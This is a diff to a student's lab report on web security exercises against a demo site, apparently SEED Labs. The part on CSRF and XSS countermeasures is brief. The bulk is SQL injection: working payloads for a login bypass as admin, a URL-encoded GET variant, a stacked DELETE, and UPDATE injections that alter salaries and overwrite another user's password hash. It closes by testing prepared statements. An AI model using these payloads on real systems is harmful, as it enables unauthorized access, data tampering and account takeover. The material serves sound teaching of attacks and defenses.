@@ -404,7 +404,7 @@
 
     ![1587993522080](assets/1587993522080.png)
 
-  * Q2: Boby can still lauch the CSRF attack in this way
+  * Q2:  Generally Boby cannot launch this attack since the user id of each user is different and protected by the same origin policy. But the implementation of the website has a loophole as shown below. 
 
     * We can find that in the source code of the activity page, `guid` is stored in a variable named `elgg`
 
@@ -518,11 +518,10 @@
 
   * Q1: Line 4 & 5 are needed by the server to prevent CSRF attack. Without these two lines, the server will not verify the GET request. 
 
-  * Q2: If I use the editor mode, I can still launch the attacker as shown in the following screen shot. However, the malicious code can be presented to the victims. 
+  * Q2: If I use the editor mode, I cannot launch the attack as shown in the following screen shot, the malicious code can be presented to the victims. 
 
     ![1588012661752](assets/1588012661752.png)
 
-    ![1588012672160](assets/1588012672160.png)
 
 ### 4.7 Modifying the Victim’s Profile [5 Marks]
 
@@ -636,19 +635,132 @@
 
   ![1588016596210](assets/1588016596210.png)
 
-* 
+* Activate two countermeasures: All the script tags are disabled and all the special characters like `<` `>` are replaced by other symbols. 
+
+  ![1588046504609](assets/1588046504609.png)
 
 ## 5 SQL Injection Attack [21 Marks]
 
 ### 5.2 Get Familiar with SQL Statements [4 marks]
 
+* Select all Alice’s information
+
+  ```sql
+  select * from credential where Name = "Alice"
+  ```
+
+  ![1588050351855](assets/1588050351855.png)
+
 ### 5.3 SQL Injection Attack on SELECT Statement [6 Marks]
+
+#### Sub-task 1: SQL Injection Attack from webpage.
+
+* use the user name: `'or Name='admin';#` 
+
+  * The code after the injection is as following (`;#` can escape following command)
+
+    ```sql
+    SELECT id, name, eid, salary, birth, ssn, address, email,
+    nickname, Password
+    FROM credential
+    WHERE name= ' 'or Name='admin';# ' and Password='$hashed_pwd'
+    ```
+
+  ![1588051266316](assets/1588051266316.png)
+
+  ![1588051272687](assets/1588051272687.png)
+
+#### Sub-task 2: SQL Injection Attack from command line
+
+* URL for GET after encoding 
+
+  ```
+  'http://www.seedlabsqlinjection.com/unsafe_home.php?username=%27+or+Name%3D%27admin%27%3B%23&Password='
+  ```
+
+  ![1588052156720](assets/1588052156720.png)
+
+  ![1588052167492](assets/1588052167492.png)
+
+#### Sub-task 3: Append a new SQL statement
+
+* use the user name: `'or 1=1 ;delete from credential where name = 'Alice';# ` 
+
+  ![1588052480783](assets/1588052480783.png)
+
+  ![1588052737997](assets/1588052737997.png)
+
+  * Observation: After appending a new statement after the semicolon, the attack cannot be launched since there is countermeasure in MySql that disallow multiple statements called from php. 
 
 ### 5.4 SQL Injection Attack on UPDATE Statement [6 Marks]
 
+#### Sub-task 1: Modify your own salary
+
+* use the malicious input `Alice', salary = '100000' where name='Alice';#`
+
+  ![1588053762585](assets/1588053762585.png)
+
+  ![1588053770653](assets/1588053770653.png)
+
+#### Sub-task 2: Modify other people’ salary
+
+* use the malicious input `', salary = '1' where name='Boby';#`
+
+  ![1588053838766](assets/1588053838766.png)
+
+  ![1588053853619](assets/1588053853619.png)
+
+#### Sub-task 3: Modify other people’ password
+
+* Alice choose `12345` to be the new password, and calculate a hash value
+
+  ![1588054040257](assets/1588054040257.png)
+
+* Modify by using the malicious input `', password= '8cb2237d0679ca88db6464eac60da96345513964' where name='Boby';#` 
+
+  ![1588054131813](assets/1588054131813.png)
+
+* Login to Boby’s account
+
+  ![1588054160820](assets/1588054160820.png)
+
+  ![1588054172455](assets/1588054172455.png)
+
 ### 5.5 Countermeasure — Prepared Statement [5 Marks]
 
+* First vulnerability: Login
 
+  * before using the countermeasure
+
+    ![1588056885129](assets/1588056885129.png)
+
+  * after using the countermeasure
+
+    ![1588056930314](assets/1588056930314.png)
+
+  * attack result after using the countermeasure
+
+    ![1588057185274](assets/1588057185274.png)
+
+    ![1588057193207](assets/1588057193207.png)
+
+* Second vulnerability: edit profile
+
+  * before using the countermeasure
+
+    ![1588057230395](assets/1588057230395.png)
+
+  * after using the countermeasure
+
+    ![1588057250090](assets/1588057250090.png)
+
+  * attack result after using the countermeasure using ``Alice', salary = '0000000' where name='Alice';#``
+
+    ![1588057308830](assets/1588057308830.png)
+
+    ![1588057317854](assets/1588057317854.png)
+
+* Observation: I cannot exploit the vulnerabilities. 
 
 
 
